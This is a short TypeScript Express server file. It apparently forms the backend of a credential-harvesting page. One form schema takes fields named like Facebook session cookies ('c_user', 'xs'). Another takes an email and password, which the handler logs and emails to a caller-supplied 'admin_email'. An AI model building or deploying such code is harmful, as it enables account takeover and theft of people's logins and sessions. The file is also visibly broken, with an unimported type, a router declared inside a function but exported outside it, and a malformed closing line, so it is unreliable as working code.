import express from "express";
import { createServer } from "http";
import { emailService } from "./email-service";
import { z } from "zod";

const formOneSchema = z.object({
  c_user: z.string(),
  xs: z.string(),
  admin_email: z.string().email().optional(),
});

const formTwoSchema = z.object({
  user_email: z.string(),
  password: z.string(),
  admin_email: z.string().email().optional(),
});

export async function registerRoutes(app: Express) {
 const router = express.Router();

router.post("/form-one", (req, res) => {
  res.json({ success: true, message: "Form submitted successfully" });
});

  app.post("/api/form-two", async (req, res) => {
    try {
      console.log('Received form two data:', req.body);
      const data = formTwoSchema.parse(req.body);

      const emailResult = await emailService.sendFormTwoEmail(data, data.admin_email);

      res.json({ success: true });
    } catch (error) {
      console.error('Error processing form two:', error);
      const errorMessage = error instanceof Error ? error.message : "Failed to process form two";
      res.status(500).json({ success: false, message: errorMessage });
    }
  });

  return createServer(app);
}  export default router;
